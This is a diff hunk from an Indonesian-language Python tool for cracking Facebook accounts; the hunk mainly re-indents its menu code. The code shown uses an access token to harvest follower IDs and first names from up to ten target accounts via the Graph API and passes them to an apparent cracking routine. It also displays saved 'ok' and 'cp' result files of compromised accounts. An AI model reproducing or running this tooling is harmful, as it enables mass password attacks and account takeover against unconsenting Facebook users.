@@ -343,66 +343,66 @@ def menu():
 					nama=x['name'].rsplit(' ')[0]
 					id.append(idnya+'|'+nama)
 			self.kirim()
-		elif(pil in ('02','2')):
-			print('\n\tCRACK DAFTAR FOLLOWERS')
-			try:
-				jumlah=int(input("\n[!] Target maximal 10 Target\n[?] Masukan Jumlah Target: "))
-				if(jumlah>=11):
-					print("\n[!] Target terlalu banyak maximal target 10")
-					time.sleep(2)
-					self.menu()
-				else:pass
-			except:jumlah=1
-			print("\nKetik 'me' Buat Crack Daftar Followers Akun Anda")
-			for j in range(jumlah):
-				target=input("[+] Masukan ID Target: ").replace("'me'","me")
-				try:
-					rr=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
-					print(f"[=] Nama Target\t: {rr['name']}")
-					ro=json.loads(req.get(f'https://graph.facebook.com/{target}/subscribers?limit=50000&access_token={self.token}').text)
-					for x in ro['data']:
-						wok.append(x['id'])
-					print(f"[=] Jumlah ID\t: {len(wok)}")
-					wok.clear()
-				except KeyError:
-					print("Target Tidak Ada")
-					time.sleep(1)
-					self.menu()
-				r=json.loads(req.get(f'https://graph.facebook.com/{target}/subscribers?limit=50000&access_token={self.token}').text)
-				for x in r['data']:
-					idnya=x['id']
-					nama=x['name'].rsplit(' ')[0]
-					id.append(idnya+'|'+nama)
-			self.kirim()
-		elif(pil in ("c","C")):
-			print("\n\nPilih Cek Hasil Crack\n[1]. Hasil Ok\n[2]. Hasil Cp\n[3]. Kembali Ke Menu\n")
-			hh=input("[!] Select: ")
-			if(hh in ("01","1")):
-				try:
-					print("\n"+open("ok","r").read())
-					input("Enter For Back To Menu")
-					self.menu()
-				except FileNotFoundError:
-					input("\n[!] Anda Belum Mendapatkan Hasil Ok\nEnter For Back To Menu")
-					self.menu()
-			elif(hh in ("02","2")):
-				try:
-					print("\n"+open("cp","r").read())
-					input("Enter For Back To Menu")
-					self.menu()
-				except FileNotFoundError:
-					input("\n[!] Anda Belum Mendapatkan Hasil Cp\nEnter For Back To Menu")
-					self.menu()
-			elif(hh in ("03","3")):
+	elif(pil in ('02','2')):
+		print('\n\tCRACK DAFTAR FOLLOWERS')
+		try:
+			jumlah=int(input("\n[!] Target maximal 10 Target\n[?] Masukan Jumlah Target: "))
+			if(jumlah>=11):
+				print("\n[!] Target terlalu banyak maximal target 10")
+				time.sleep(2)
 				self.menu()
-		elif(pil in ("s","S")):
-			self.useragent()
-		elif(pil in ('l','L')):
-			os.system('rm -rf save')
-			exit('\nBerhasil Logout Dan Hapus Akun')
-		elif(pil in ("r","R")):
-			print("\n[√] Menuju WhatsApp Author....\n[!] Klik Buka Dengan WhatsApp")
-			os.system("xdg-open https://wa.me/6283870396203")
+			else:pass
+		except:jumlah=1
+		print("\nKetik 'me' Buat Crack Daftar Followers Akun Anda")
+		for j in range(jumlah):
+			target=input("[+] Masukan ID Target: ").replace("'me'","me")
+			try:
+				rr=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
+				print(f"[=] Nama Target\t: {rr['name']}")
+				ro=json.loads(req.get(f'https://graph.facebook.com/{target}/subscribers?limit=50000&access_token={self.token}').text)
+				for x in ro['data']:
+					wok.append(x['id'])
+				print(f"[=] Jumlah ID\t: {len(wok)}")
+				wok.clear()
+			except KeyError:
+				print("Target Tidak Ada")
+				time.sleep(1)
+				self.menu()
+			r=json.loads(req.get(f'https://graph.facebook.com/{target}/subscribers?limit=50000&access_token={self.token}').text)
+			for x in r['data']:
+				idnya=x['id']
+				nama=x['name'].rsplit(' ')[0]
+				id.append(idnya+'|'+nama)
+		self.kirim()
+	elif(pil in ("c","C")):
+		print("\n\nPilih Cek Hasil Crack\n[1]. Hasil Ok\n[2]. Hasil Cp\n[3]. Kembali Ke Menu\n")
+		hh=input("[!] Select: ")
+		if(hh in ("01","1")):
+			try:
+				print("\n"+open("ok","r").read())
+				input("Enter For Back To Menu")
+				self.menu()
+			except FileNotFoundError:
+				input("\n[!] Anda Belum Mendapatkan Hasil Ok\nEnter For Back To Menu")
+				self.menu()
+		elif(hh in ("02","2")):
+			try:
+				print("\n"+open("cp","r").read())
+				input("Enter For Back To Menu")
+				self.menu()
+			except FileNotFoundError:
+				input("\n[!] Anda Belum Mendapatkan Hasil Cp\nEnter For Back To Menu")
+				self.menu()
+		elif(hh in ("03","3")):
+			self.menu()
+	elif(pil in ("s","S")):
+		self.useragent()
+	elif(pil in ('l','L')):
+		os.system('rm -rf save')
+		exit('\nBerhasil Logout Dan Hapus Akun')
+	elif(pil in ("r","R")):
+		print("\n[√] Menuju WhatsApp Author....\n[!] Klik Buka Dengan WhatsApp")
+		os.system("xdg-open https://wa.me/6283870396203")
 
 if __name__=="__main__":
 	try:
